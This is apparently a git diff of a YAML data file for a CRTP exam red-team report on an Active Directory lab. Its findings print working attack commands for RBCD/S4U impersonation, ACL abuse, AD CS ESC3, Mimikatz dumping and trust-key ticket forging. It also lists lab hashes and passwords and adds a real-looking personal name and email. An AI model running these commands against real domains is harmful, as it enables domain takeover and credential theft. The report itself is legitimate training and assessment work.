@@ -1,5 +1,5 @@
 # =============================================================================
-# CRTP Exam — Red Team Assessment Report (data file)
+# CRTP Exam - Red Team Assessment Report (data file)
 #
 # This is the ONLY file you normally edit. Fill in the details, then run:
 #
@@ -19,14 +19,14 @@
 # ---- People on the engagement ------------------------------------------------
 # Roles: lead -> "Lead Pentester", pentester -> "Red Team Operator", reviewer.
 pentesters:
-  - name: "Student"                    # <-- put your name as it should appear
-    email: "srqllabmya@gmail.com"
+  - name: "Meet Darji"
+    email: "meetd5770@gmail.com"
     roles: ["lead", "pentester"]
 
 # ---- Report-level fields -----------------------------------------------------
 report:
-  title: "Certified Red Team Professional (CRTP) — Exam Report"
-  customer_name: "Altered Security — CRTP Exam Lab"
+  title: "Certified Red Team Professional (CRTP) - Exam Report"
+  customer_name: "Altered Security - CRTP Exam Lab"
   report_version: "1.0"
   report_date: "2026-08-17"
   start_date: "2026-08-16"
@@ -36,10 +36,10 @@ report:
 
   list_of_changes:
     - version: "0.1"
-      description: "Initial draft — attack path captured"
+      description: "Initial draft, attack path captured"
       date: "2026-08-16"
     - version: "1.0"
-      description: "Final version — narrative, evidence and remediation completed"
+      description: "Final version, narrative, evidence and remediation completed"
       date: "2026-08-17"
 
   # ---- Executive Summary (markdown) -----------------------------------------
@@ -50,7 +50,7 @@ report:
     Professional (CRTP) examination. Testing began from an assumed-breach
     position: a single low-privileged user, `tech\studentuser`, on the foothold
     workstation **STUDVM**. No exploit of unpatched software was used at any
-    point — every step abused a legitimate Windows or Active Directory feature
+    point. Every step abused a legitimate Windows or Active Directory feature
     that had been left in an insecure configuration.
 
     From that starting point we obtained **complete control of the `tech.corp`
@@ -67,8 +67,8 @@ report:
     - **Resource-Based Constrained Delegation (RBCD)** that a machine account
       could configure on itself let us impersonate a Domain Admin to a
       management server.
-    - **Dangerous Active Directory ACLs** (self-membership into a privileged
-      group, and force-password-reset rights over another user) extended access
+    - **Dangerous Active Directory ACLs** (self-membership into privileged
+      groups, and force-password-reset rights over another user) extended access
       without ever cracking a password.
     - **An Active Directory Certificate Services misconfiguration (ESC3)** turned
       a low-privileged certificate enrollment right into a Domain Admin logon.
@@ -76,30 +76,31 @@ report:
       allowed a forged inter-realm ticket to be honoured by `finance.corp`.
 
     Overall posture is assessed as **Critical**. A single foothold credential was
-    sufficient to reach Enterprise Admin in `tech.corp` and to cross the trust
-    boundary into a second forest. The remediation section prioritises the
+    sufficient to reach Enterprise Admin in `tech.corp` (the `techadmin` account
+    is a member of both Domain Admins and Enterprise Admins) and to cross the
+    trust boundary into a second forest. The recommendations prioritise the
     changes that break the *earliest* links in this chain, because doing so
     collapses everything downstream of them.
 
-  # ---- Conclusion (markdown) ------------------------------------------------
+  # ---- Conclusion (markdown). Rendered as its own section near the end. ------
   conclusion: |
     The `tech.corp` domain can be fully compromised by any attacker who obtains a
     single standard domain credential, and that compromise does not stop at the
-    domain boundary — it extends across the forest trust into `finance.corp`. The
+    domain boundary. It extends across the forest trust into `finance.corp`. The
     path required no software vulnerability; it was made possible entirely by
     identity, delegation, certificate-services and trust misconfigurations.
 
     Remediation should be sequenced by attack-path impact rather than by treating
     each finding in isolation:
 
-    1. **Remove secrets from file shares and deploy LAPS** — this eliminates the
+    1. **Remove secrets from file shares and deploy LAPS.** This eliminates the
        initial foothold escalation and the credential reuse that followed it.
-    2. **Audit and remove dangerous delegation and ACLs** — RBCD write rights,
+    2. **Audit and remove dangerous delegation and ACLs.** RBCD write rights,
        self-membership and force-password-reset ACEs on privileged objects were
        the backbone of the domain takeover.
-    3. **Harden AD CS** — remove the ESC3 enrollment-agent capability and enforce
+    3. **Harden AD CS.** Remove the ESC3 enrollment-agent capability and enforce
        manager approval; this closes the certificate path to Domain Admin.
-    4. **Enforce SID filtering / quarantine on the forest trust** — this is the
+    4. **Enforce SID filtering / quarantine on the forest trust.** This is the
        control that would have stopped the cross-forest pivot.
 
     Applying items 1 and 2 alone would have halted this assessment before Domain
@@ -113,16 +114,16 @@ report:
     ATT&CK framework. Beginning with the credentials of a single low-privileged
     domain user, testing progressed through the following phases:
 
-    - **Reconnaissance & Enumeration** — mapping users, groups, computers, ACLs,
+    - **Reconnaissance and Enumeration:** mapping users, groups, computers, ACLs,
       certificate templates, delegation and trusts using adPEAS, PowerView and
       BloodHound.
-    - **Privilege Escalation** — abusing file-share secrets, delegation (RBCD),
+    - **Privilege Escalation:** abusing file-share secrets, delegation (RBCD),
       dangerous ACLs and AD CS (ESC3).
-    - **Credential Access** — extracting secrets from LSASS, the SAM and LSA
+    - **Credential Access:** extracting secrets from LSASS, the SAM and LSA
       secrets with an evasive build of Mimikatz.
-    - **Lateral Movement** — replaying harvested hashes and Kerberos tickets
+    - **Lateral Movement:** replaying harvested hashes and Kerberos tickets
       across hosts (Over-Pass-the-Hash, S4U, Pass-the-Ticket).
-    - **Domain & Forest Dominance** — reaching Domain / Enterprise Admin in
+    - **Domain and Forest Dominance:** reaching Domain and Enterprise Admin in
       `tech.corp` and pivoting across the trust into `finance.corp`.
 
   # ---- Objective (markdown). Optional; appears under Methodology. ------------
@@ -141,16 +142,16 @@ report:
   scope: |
     **Targeted Systems:**
 
-    | Hostname | IP | Role | Domain |
-    |:---|:---|:---|:---|
-    | STUDVM | 172.16.100.10 | Foothold workstation (assumed breach) | tech.corp |
-    | TECH-DC | — | Domain Controller / AD CS Certificate Authority | tech.corp |
-    | MGMTSRV | — | Management server (RBCD target) | tech.corp |
-    | TECHSRV30 | — | Application server | tech.corp |
-    | ADMINSRV86 | — | Administration server | tech.corp |
-    | FINANCE-DC | 172.16.3.4 | Forest-root Domain Controller | finance.corp |
+    | Hostname | Role | Domain |
+    |:---|:---|:---|
+    | STUDVM | Foothold workstation (assumed breach) | tech.corp |
+    | TECH-DC | Domain Controller / AD CS Certificate Authority | tech.corp |
+    | MGMTSRV | Management server (RBCD target) | tech.corp |
+    | TECHSRV30 | Application server | tech.corp |
+    | ADMINSRV86 | Administration server | tech.corp |
+    | FINANCE-DC | Forest-root Domain Controller | finance.corp |
 
-    **Forest trust:** `tech.corp` ⇄ `finance.corp` — Bidirectional, Transitive,
+    **Forest trust:** `tech.corp` to `finance.corp`, Bidirectional, Transitive,
     marked `QUARANTINED_DOMAIN` (SID filtering enabled on the trust).
 
   # ---- Provided access (markdown) -------------------------------------------
@@ -173,7 +174,7 @@ report:
 
   # ---- Appendix (list of titled markdown sections) --------------------------
   appendix_sections:
-    - title: "Compromised Credentials & Secrets"
+    - title: "Compromised Credentials and Secrets"
       content: |
         The following secrets were recovered during the assessment. All are from
         the isolated exam lab and are reproduced here as proof of compromise.
@@ -188,7 +189,7 @@ report:
         | `causer` | Password (LSA secret) | `Ca@8170734525364357` |
         | `ADMINSRV86$` | NTLM | `390d9db95b492e45c4e43b85d2b9c432` |
         | `tech\krbtgt` | NTLM | `2e1b94e534db024815fdb30273174dc6` |
-        | `tech.corp ⇄ finance.corp` trust key | RC4 | `a0ba8caa534fc2f186ca86ea7b5cee6e` |
+        | `tech.corp` / `finance.corp` trust key | RC4 | `a0ba8caa534fc2f186ca86ea7b5cee6e` |
         | **Final objective flag** | flag | `64061b82-fb44-48d5-b2d2-761766634e30` |
 
     - title: "Key Domain Facts"
@@ -200,7 +201,7 @@ report:
         | Forest / Domain functional level | Windows Server 2016 |
         | Domain Controller | `tech-dc.tech.corp` (Windows Server 2022) |
         | Certificate Authority | `tech-tech-dc-CA` (on TECH-DC) |
-        | Trusting forest | `finance.corp` — SID `S-1-5-21-3132463012-610816204-3671931044` |
+        | Trusting forest | `finance.corp`, SID `S-1-5-21-3132463012-610816204-3671931044` |
         | `ms-DS-MachineAccountQuota` | 10 (any user may join 10 computers) |
         | LAPS | Not deployed (0 of 5 computers protected) |
         | Tier-0 in Protected Users | 0% (`techadmin` unprotected) |
@@ -216,29 +217,16 @@ report:
         | Rubeus | Kerberos ticket manipulation (asktgt, S4U, asktgs, PtT, PKINIT) |
         | Certify | AD CS enumeration and certificate abuse (ESC3) |
         | SafetyKatz / Mimikatz (evasive build) | LSASS / SAM / LSA / trust-key extraction, DCSync |
-        | OpenSSL | PEM → PFX certificate conversion |
-
-    - title: "Remediation Checklist"
-      content: |
-        - [ ] Remove all cleartext credentials from scripts and file shares; restrict share ACLs.
-        - [ ] Deploy **LAPS** so local administrator passwords are unique per host.
-        - [ ] Audit and remove **RBCD** write rights (`msDS-AllowedToActOnBehalfOfOtherIdentity`).
-        - [ ] Remove dangerous ACEs: self-membership on privileged groups, User-Force-Change-Password.
-        - [ ] Harden **AD CS**: remove the ESC3 enrollment-agent EKU, require manager approval.
-        - [ ] Add all Tier-0 accounts (e.g. `techadmin`) to **Protected Users**.
-        - [ ] Enforce **SID filtering / quarantine** on the `finance.corp` trust in both directions.
-        - [ ] Rotate the `krbtgt` password twice and the inter-realm trust key.
-        - [ ] Disable RC4 for Kerberos; require AES.
+        | OpenSSL | PEM to PFX certificate conversion |
 
 # =============================================================================
 # Findings: the "Compromission Path", rendered in order.
 # =============================================================================
 findings:
   # ---------------------------------------------------------------------------
-  - title: "F-1 · Initial Foothold — Cleartext Credentials in a File Share"
+  - title: "F-1 · Initial Foothold, Cleartext Credentials in a File Share"
     hostname: "STUDVM"
     fqdn: "studvm.tech.corp"
-    ip_address: "172.16.100.10"
     os_details: "Windows 10 (foothold workstation)"
     description: |
       Starting as the unprivileged user `tech\studentuser`, enumeration of
@@ -290,10 +278,9 @@ findings:
       - "https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"
 
   # ---------------------------------------------------------------------------
-  - title: "F-2 · Local Privilege Escalation & LSASS Credential Theft"
+  - title: "F-2 · Local Privilege Escalation and LSASS Credential Theft"
     hostname: "STUDVM"
     fqdn: "studvm.tech.corp"
-    ip_address: "172.16.100.10"
     os_details: "Windows 10 (foothold workstation)"
     description: |
       With local administrator rights as `studentadmin`, we established full
@@ -339,19 +326,21 @@ findings:
       - "https://learn.microsoft.com/windows/security/identity-protection/credential-guard/"
 
   # ---------------------------------------------------------------------------
-  - title: "F-3 · Domain Reconnaissance & Attack-Path Discovery"
+  - title: "F-3 · Domain Reconnaissance and Attack-Path Discovery"
     hostname: "tech.corp (domain-wide)"
     fqdn: "tech-dc.tech.corp"
-    ip_address: "—"
     os_details: "Windows Server 2022 Datacenter (Domain Controller)"
     description: |
       Automated and manual enumeration built the map that drove every later
       step. adPEAS and PowerView revealed the forest trust to `finance.corp`, an
       unconstrained-delegation domain controller, `ms-DS-MachineAccountQuota`
-      left at the default of 10, no LAPS anywhere in the domain, an unprotected
-      Tier-0 admin (`techadmin`, RID 500), and an AD CS certificate authority
-      publishing an ESC3-vulnerable template. BloodHound confirmed a short path
-      to Domain Admin.
+      left at the default of 10, no LAPS anywhere in the domain, and an
+      unprotected Tier-0 admin. The privileged account **`techadmin`** is in fact
+      the renamed built-in Administrator (RID 500) and is a direct member of both
+      **Domain Admins and Enterprise Admins**, with `admincount=1` and no
+      Protected Users membership. adPEAS also flagged an AD CS certificate
+      authority publishing an ESC3-vulnerable template, and BloodHound confirmed a
+      short path to Domain Admin.
     compromission_steps: |
       adPEAS identifies the domain and the **bidirectional, quarantined trust**
       to `finance.corp`:
@@ -364,18 +353,26 @@ findings:
 
       ![Forest trust to `finance.corp` discovered by adPEAS](images/img04.png)
 
+      Privileged-account enumeration shows `techadmin` is the RID 500 account and
+      sits in every Tier-0 group:
+
+      ```text
+      sAMAccountName : techadmin
+      objectSid      : S-1-5-21-1600556212-896947471-994435180-500
+      privilegedGroups : Domain Admins, Enterprise Admins, Schema Admins, Administrators
+      description    : Built-in account for administering the computer/domain
+      ```
+
+      ![`techadmin` (RID 500) in Domain Admins and Enterprise Admins](images/img10.png){.evidence}
+
       Key weaknesses surfaced during enumeration:
 
       | Observation | Impact |
       | :--- | :--- |
       | `ms-DS-MachineAccountQuota` = 10 | Any user can join computer accounts |
       | No LAPS (0 / 5 computers) | Local admin password reuse across hosts |
-      | `techadmin` (RID 500) not in Protected Users | Tier-0 account exposed to theft/impersonation |
+      | `techadmin` not in Protected Users | Tier-0 account exposed to theft/impersonation |
       | AD CS template `FIDO` / `FIDOUsers` | ESC3 enrollment-agent abuse possible |
-
-      BloodHound's shortest-path-to-Domain-Admin view:
-
-      ![BloodHound shortest path to Domain Admin](images/img14.png){.evidence}
 
       Session hunting and delegation checks point at the next targets:
 
@@ -386,11 +383,13 @@ findings:
       Get-DomainComputer -Unconstrained | select name, useraccountcontrol
       # tech-dc  SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
       ```
+
+      ![BloodHound shortest path to Domain Admin](images/img14.png){.evidence}
     recommendation: |
       - Lower `ms-DS-MachineAccountQuota` to **0** so standard users cannot create
         computer accounts (a prerequisite for several delegation attacks).
-      - Deploy LAPS, add Tier-0 accounts to **Protected Users**, and review AD CS
-        template permissions (see F-8).
+      - Deploy LAPS, add Tier-0 accounts such as `techadmin` to **Protected
+        Users**, and review AD CS template permissions (see F-8).
       - Monitor for enumeration tooling (LDAP-heavy queries, SharpHound
         collection patterns).
     references:
@@ -398,18 +397,17 @@ findings:
       - "https://bloodhound.readthedocs.io/"
 
   # ---------------------------------------------------------------------------
-  - title: "F-4 · Resource-Based Constrained Delegation (RBCD) → MGMTSRV"
+  - title: "F-4 · Resource-Based Constrained Delegation (RBCD) to MGMTSRV"
     hostname: "MGMTSRV"
     fqdn: "mgmtsrv.tech.corp"
-    ip_address: "—"
     os_details: "Windows Server (member server)"
     description: |
       The compromised machine account `STUDVM$` held write access over the
       `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of **MGMTSRV**. This
       is the precondition for **Resource-Based Constrained Delegation**: by
       pointing MGMTSRV's delegation back at `STUDVM$` we could use the Kerberos
-      S4U extensions to impersonate **any** user — including the Domain Admin
-      `techadmin` — to services on MGMTSRV, giving full command execution on the
+      S4U extensions to impersonate **any** user (including the Domain Admin
+      `techadmin`) to services on MGMTSRV, giving full command execution on the
       host. Dumping the server then yielded the `techservice` account used in the
       next stage.
     compromission_steps: |
@@ -428,7 +426,7 @@ findings:
 
       ![Configuring Resource-Based Constrained Delegation on MGMTSRV](images/img26.png)
 
-      Use S4U2Self + S4U2Proxy to impersonate the Domain Admin `techadmin`:
+      Use S4U2Self and S4U2Proxy to impersonate the Domain Admin `techadmin`:
 
       ```powershell
       Rubeus.exe s4u /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
@@ -438,8 +436,19 @@ findings:
 
       ![S4U2Self/S4U2Proxy forging a `techadmin` service ticket to MGMTSRV](images/img27.png){.evidence}
 
-      With the ticket injected, command execution on MGMTSRV is confirmed and the
-      host's credentials are dumped, revealing the `techservice` service account:
+      With the ticket injected, operating-system-level command execution on
+      MGMTSRV as `techadmin` is confirmed:
+
+      ```text
+      winrs -r:mgmtsrv.tech.corp cmd
+      Microsoft Windows [Version 10.0.20348.4052]
+      C:\Users\techadmin>
+      ```
+
+      ![OS command execution on MGMTSRV as `techadmin`](images/img28.png)
+
+      The host's credentials are then dumped, revealing the `techservice` service
+      account used in F-5:
 
       ```text
       * Username : techservice
@@ -461,18 +470,17 @@ findings:
       - "https://learn.microsoft.com/windows-server/security/kerberos/kerberos-constrained-delegation-overview"
 
   # ---------------------------------------------------------------------------
-  - title: "F-5 · Active Directory ACL Abuse — AddSelf & Force-Change-Password"
+  - title: "F-5 · Active Directory ACL Abuse, AddSelf and Force-Change-Password"
     hostname: "tech.corp (Directory ACLs)"
     fqdn: "tech-dc.tech.corp"
-    ip_address: "—"
     os_details: "Active Directory object permissions"
     description: |
       The `techservice` account recovered from MGMTSRV held a dangerous ACL
       chain. It could **add itself** to the privileged `Management` group
-      (a `Self`/`Self-Membership` right), and the `Management` group in turn held
-      **`User-Force-Change-Password`** over the user `puretech`. By walking this
-      chain we reset `puretech`'s password without knowing its current value —
-      a pure permissions abuse that requires no cracking.
+      (a `Self` / `Self-Membership` right), and the `Management` group in turn
+      held **`User-Force-Change-Password`** over the user `puretech`. By walking
+      this chain we reset `puretech`'s password without knowing its current
+      value, a pure permissions abuse that requires no cracking.
     compromission_steps: |
       Enumerate what `techservice` can do, and the group's rights over `puretech`:
 
@@ -483,7 +491,7 @@ findings:
 
       ![`Management` group holds Force-Change-Password over `puretech`](images/img35.png)
 
-      Add `techservice` into the `Management` group, then reset `puretech`:
+      Add `techservice` into the `Management` group:
 
       ```powershell
       Add-DomainGroupMember -Identity "Management" -Members "techservice" -Domain tech.corp -Verbose
@@ -491,6 +499,19 @@ findings:
       ```
 
       ![Self-adding `techservice` into the privileged `Management` group](images/img39.png)
+
+      The new group membership only takes effect in a **fresh ticket**, so request
+      a new TGT for `techservice` in a sacrificial logon session before using the
+      group's rights:
+
+      ```powershell
+      Rubeus.exe asktgt /user:techservice /rc4:4311a88033b35fbbd00a681b005b6ead `
+        /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+      ```
+
+      ![Fresh `techservice` TGT requested after the group change](images/img41.png)
+
+      With the refreshed context, force-reset the `puretech` password:
 
       ```powershell
       Set-DomainUserPassword -Identity puretech -AccountPassword $pass -Verbose
@@ -508,7 +529,7 @@ findings:
         `Management`, and the **User-Force-Change-Password** right the group holds
         over `puretech`; grant such rights only to dedicated, monitored admin
         roles.
-      - Run regular ACL reviews (BloodHound / `Get-DomainObjectAcl`) to catch
+      - Run regular ACL reviews (BloodHound, `Get-DomainObjectAcl`) to catch
         privilege-granting ACEs on users and groups.
       - Alert on Event ID 4724/4738 (password reset / account change) for
         sensitive accounts.
@@ -517,25 +538,41 @@ findings:
       - "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"
 
   # ---------------------------------------------------------------------------
-  - title: "F-6 · Lateral Movement to TECHSRV30 & Local Secret Extraction"
+  - title: "F-6 · Lateral Movement to TECHSRV30 and Local Secret Extraction"
     hostname: "TECHSRV30"
     fqdn: "techsrv30.tech.corp"
-    ip_address: "—"
     os_details: "Windows Server (member server)"
     description: |
-      `puretech` (via `pureadmin`) held local administrator rights on
-      **TECHSRV30**. After relaying tooling to the host through a port-proxy, the
-      SAM and cached secrets were extracted with an evasive Mimikatz build. This
-      exposed the local administrator `securetech` and the machine account
-      `TECHSRV30$` — the latter being a member of the custom `srvusers` group that
-      matters for the certificate attack in F-8.
+      The `puretech` account held local administrator rights on **TECHSRV30**,
+      confirmed by an interactive `winrs` session whose `whoami /priv` output
+      shows the full set of administrative privileges enabled (SeDebug,
+      SeBackup, SeRestore, SeTakeOwnership and others). After relaying tooling to
+      the host, the SAM and cached secrets were extracted, exposing the local
+      administrator `securetech` and the machine account `TECHSRV30$`. `TECHSRV30$`
+      is a member of the custom **`srvusers`** group through a `Self-Membership`
+      ACL; that group membership is the pivot used to reach ADMINSRV86 in F-7.
     compromission_steps: |
-      Relay the loader to TECHSRV30 via a port-proxy and dump the machine account:
+      Confirm local administrator command execution on TECHSRV30 as `puretech`:
+
+      ```text
+      winrs -r:techsrv30.tech.corp cmd
+      C:\Users\puretech> whoami /priv
+      # SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,
+      # SeTakeOwnershipPrivilege, SeImpersonatePrivilege ... all Enabled
+      ```
+
+      ![OS command execution and full privileges as `puretech` on TECHSRV30](images/img46.png){.evidence}
+
+      TECHSRV30 could not reach the operator tooling directly, so a **port-proxy**
+      was configured on the host to relay traffic back through the STUDVM
+      foothold, from which the loader and SafetyKatz were staged:
 
       ```powershell
       netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
-        connectport=80 connectaddress=172.16.100.10
+        connectport=80 connectaddress=<STUDVM foothold>
       ```
+
+      The machine account is recovered from LSASS:
 
       ```text
       * Username : techsrv30$
@@ -558,8 +595,8 @@ findings:
     recommendation: |
       - Deploy **LAPS** to eliminate shared local-administrator passwords across
         member servers.
-      - Restrict who holds local administrator rights on application servers;
-        apply the tiered administration model.
+      - Restrict who holds local administrator rights on application servers and
+        review membership of custom groups such as `srvusers`.
       - Enable **Credential Guard** and monitor for SAM/LSA dumping (Event ID
         4688 with suspicious process lineage).
     references:
@@ -567,19 +604,45 @@ findings:
       - "https://attack.mitre.org/techniques/T1021/"
 
   # ---------------------------------------------------------------------------
-  - title: "F-7 · LSA Secrets Harvest — `causer` & ADMINSRV86"
+  - title: "F-7 · Group-Membership Pivot to ADMINSRV86 and LSA Secrets Harvest"
     hostname: "ADMINSRV86"
     fqdn: "adminsrv86.tech.corp"
-    ip_address: "—"
     os_details: "Windows Server (member server)"
     description: |
-      Extraction of LSA secrets exposed the password for the **`causer`** account,
-      stored as a service credential under the `SNMPTRAP` secret, along with the
-      `ADMINSRV86$` machine account. The `causer` account is significant because
-      it holds the certificate-enrollment rights abused in F-8 — this finding is
-      the bridge from credential theft to the AD CS escalation.
+      This finding is the bridge from TECHSRV30 (F-6) to the certificate attack
+      (F-8). Because `TECHSRV30$` holds a `Self-Membership` right on the
+      **`srvusers`** group, and that group grants local administrator rights on
+      **ADMINSRV86**, we added `TECHSRV30$` to `srvusers`, requested a
+      `TECHSRV30$` ticket in a sacrificial session, and used it to reach
+      ADMINSRV86. Dumping LSA secrets there exposed the **`causer`** account
+      (stored as the `SNMPTRAP` service credential) in cleartext, along with the
+      `ADMINSRV86$` machine account. `causer` is the account that holds the
+      certificate-enrollment rights abused in F-8.
     compromission_steps: |
-      Dump LSA secrets and recover the `causer` service password in cleartext:
+      `TECHSRV30$` has a `Self-Membership` ACE on `srvusers`; add it to the group:
+
+      ```powershell
+      Add-DomainGroupMember -Identity "srvusers" -Members "techsrv30$" -Domain tech.corp -Verbose
+      # VERBOSE: [Add-DomainGroupMember] Adding member 'techsrv30$' to group 'srvusers'
+
+      Get-DomainGroupMember -Identity "srvusers"
+      # MemberName : TECHSRV30$   (S-1-5-21-1600556212-896947471-994435180-1104)
+      ```
+
+      ![`TECHSRV30$` self-added to the `srvusers` group (local admin on ADMINSRV86)](images/img53.png)
+
+      Request a `TECHSRV30$` TGT in a sacrificial logon session, giving admin
+      access to ADMINSRV86 through the `srvusers` membership:
+
+      ```powershell
+      Rubeus.exe asktgt /user:techsrv30$ /rc4:04b37fd7d28ab7c9b3cbe36336d19581 `
+        /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+      ```
+
+      ![`TECHSRV30$` ticket requested for the pivot to ADMINSRV86](images/img55.png){.evidence}
+
+      On ADMINSRV86, dump LSA secrets and recover the `causer` service password in
+      cleartext:
 
       ```text
       Secret : _SC_SNMPTRAP / service 'SNMPTRAP' with username : causer@tech.corp
@@ -596,36 +659,38 @@ findings:
       * NTLM     : 390d9db95b492e45c4e43b85d2b9c432
       ```
     recommendation: |
+      - Remove the `Self-Membership` ACE that lets `TECHSRV30$` join `srvusers`,
+        and review why a computer account grants local admin on ADMINSRV86.
       - Avoid running services under domain user accounts with static passwords;
         migrate `SNMPTRAP` and similar services to **gMSA**.
       - Restrict local administrator access so LSA secrets cannot be read, and
         enable **Credential Guard**.
-      - Rotate the `causer` password and review its certificate-enrollment rights
-        (see F-8).
     references:
       - "https://attack.mitre.org/techniques/T1003/004/"
-      - "https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"
+      - "https://attack.mitre.org/techniques/T1098/"
 
   # ---------------------------------------------------------------------------
-  - title: "F-8 · AD CS ESC3 — Enrollment-Agent Abuse to Domain Admin"
+  - title: "F-8 · AD CS ESC3, Enrollment-Agent Abuse to Domain Admin"
     hostname: "TECH-DC (tech-tech-dc-CA)"
     fqdn: "tech-dc.tech.corp"
-    ip_address: "—"
-    os_details: "Windows Server 2022 — Active Directory Certificate Services"
+    os_details: "Windows Server 2022, Active Directory Certificate Services"
     description: |
       The certificate authority `tech-tech-dc-CA` published a template (`FIDO`)
       whose Extended Key Usage included **Certificate Request Agent** and which
-      `causer` was permitted to enrol in — the classic **ESC3** misconfiguration.
+      `causer` was permitted to enrol in, the classic **ESC3** misconfiguration.
       An enrollment-agent certificate can request certificates *on behalf of* any
-      other user. We used it to enrol a certificate for the Domain Admin
-      **`techadmin`** via the `FIDOUsers` template, then used that certificate to
-      authenticate with **PKINIT** and obtain a Domain Admin TGT — a full domain
-      takeover driven entirely by the PKI.
+      other user. Using `causer`, we enrolled an agent certificate, then requested
+      a certificate for the Domain Admin **`techadmin`** via the `FIDOUsers`
+      template, used that certificate to authenticate with **PKINIT**, obtained a
+      Domain Admin TGT, and proved operating-system-level command execution on the
+      domain controller.
     compromission_steps: |
-      As `causer`, request the enrollment-agent certificate from the `FIDO`
-      template and convert it to PFX:
+      Launch a logon session as `causer` with the recovered password, then request
+      the enrollment-agent certificate from the `FIDO` template and convert it to
+      PFX:
 
       ```powershell
+      runas /user:TECH\causer /netonly cmd.exe
       .\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDO
       .\openssl\openssl.exe pkcs12 -in .\esc3agent.pem -keyex `
         -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out .\esc3agent.pfx
@@ -655,7 +720,18 @@ findings:
       # UserName : techadmin (NT_PRINCIPAL)   ->  ticket for krbtgt/tech.corp
       ```
 
-      ![Domain Admin (`techadmin`) TGT obtained via PKINIT](images/img64.png){.evidence}
+      Confirm operating-system-level command execution on the domain controller as
+      `techadmin`, satisfying the scope objective for TECH-DC:
+
+      ```text
+      klist
+      #  Client: techadmin @ TECH.CORP
+      winrs -r:tech-dc.tech.corp "whoami && hostname"
+      #  tech\techadmin
+      #  tech-dc
+      ```
+
+      ![Domain Admin TGT via PKINIT and OS command execution on TECH-DC](images/img65.png){.evidence}
     recommendation: |
       - Remove the **Certificate Request Agent** EKU from the `FIDO` template, or
         restrict enrollment to a small, trusted group and require **CA manager
@@ -663,21 +739,20 @@ findings:
       - Restrict the `FIDOUsers` template so enrollment agents cannot request on
         behalf of Tier-0 accounts; enable the **enrollment-agent restrictions**
         on the CA.
-      - Monitor for `Certify`/certificate-request activity and PKINIT logons for
+      - Monitor for `Certify` / certificate-request activity and PKINIT logons for
         privileged users.
     references:
       - "https://attack.mitre.org/techniques/T1649/"
       - "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
 
   # ---------------------------------------------------------------------------
-  - title: "F-9 · Cross-Forest Compromise — Trust-Key Forgery into finance.corp"
+  - title: "F-9 · Cross-Forest Compromise, Trust-Key Forgery into finance.corp"
     hostname: "FINANCE-DC"
     fqdn: "finance-dc.finance.corp"
-    ip_address: "172.16.3.4"
     os_details: "Windows Server 2022 (finance.corp Domain Controller)"
     description: |
       With Domain Admin in `tech.corp` we extracted the **inter-realm trust key**
-      for the `tech.corp ⇄ finance.corp` trust. Because the trust key lets us
+      for the `tech.corp` / `finance.corp` trust. Because the trust key lets us
       forge an inter-realm TGT that presents as a *native* `finance.corp`
       principal, we impersonated the built-in administrator **`finadmin`**
       (RID 500) and crossed into `finance.corp`. From there we reached a
@@ -686,8 +761,8 @@ findings:
       objective flag on the `finance.corp` domain controller.
 
       > **Note on SID filtering.** The trust is marked `QUARANTINED_DOMAIN`, so a
-      > naïve Golden Ticket that injects a foreign *Enterprise Admins* SID
-      > (RID 519) via SID history is **filtered and rejected** — SID filtering
+      > naive Golden Ticket that injects a foreign *Enterprise Admins* SID
+      > (RID 519) via SID history is **filtered and rejected**, SID filtering
       > working as designed. The successful approach instead forges an inter-realm
       > TGT with the **trust key** and impersonates a *native* `finance.corp`
       > account (RID 500), which is not stripped by the outbound filter.
@@ -711,7 +786,7 @@ findings:
       Enterprise Admins (RID 519) was rejected by the quarantined trust:
 
       ```powershell
-      # Superseded — foreign RID 519 stripped by SID filtering on the trust
+      # Superseded: foreign RID 519 stripped by SID filtering on the trust
       .\SafetyKatz.exe "kerberos::golden /user:administrator /domain:tech.corp `
         /sid:S-1-5-21-1600556212-896947471-994435180 `
         /sids:S-1-5-21-3132463012-610816204-3671931044-519 `
@@ -719,7 +794,7 @@ findings:
         /ticket:finance.kirbi" "exit"
       ```
 
-      **Working approach — forge an inter-realm TGT with the trust key**,
+      **Working approach: forge an inter-realm TGT with the trust key**,
       impersonating the native `finance.corp` administrator `finadmin` (RID 500):
 
       ```powershell
@@ -734,12 +809,12 @@ findings:
 
       ```powershell
       .\Rubeus.exe asktgs /ticket:finadmin_in.kirbi `
-        /service:cifs/finance-dc.finance.corp /dc:172.16.3.4 /ptt /nowrap
+        /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt /nowrap
       ```
 
       ![Inter-realm TGT forged for `finadmin` and exchanged for a CIFS ticket](images/img69.png){.evidence}
 
-      Access the cross-forest share — it exposes an **unencrypted** private key
+      Access the cross-forest share; it exposes an **unencrypted** private key
       `finadmin.pem`. The `openssl` conversion only prompts for an *export*
       password (the one being set), never an *import* password, proving the PEM
       held an unprotected private key:
@@ -789,8 +864,8 @@ findings:
       ![Final objective flag read on FINANCE-DC as `finadmin`](images/img74.png){.evidence}
     recommendation: |
       - **Enforce SID filtering / selective authentication** on the `finance.corp`
-        trust in *both* directions so that forged inter-realm tickets — even those
-        impersonating native RID 500 accounts — cannot cross the boundary.
+        trust in *both* directions so that forged inter-realm tickets, even those
+        impersonating native RID 500 accounts, cannot cross the boundary.
       - Treat the **forest**, not the domain, as the security boundary; keep
         highly sensitive assets in a separate, tightly-trusted forest.
       - **Never store unencrypted private keys** on file shares; the exposed
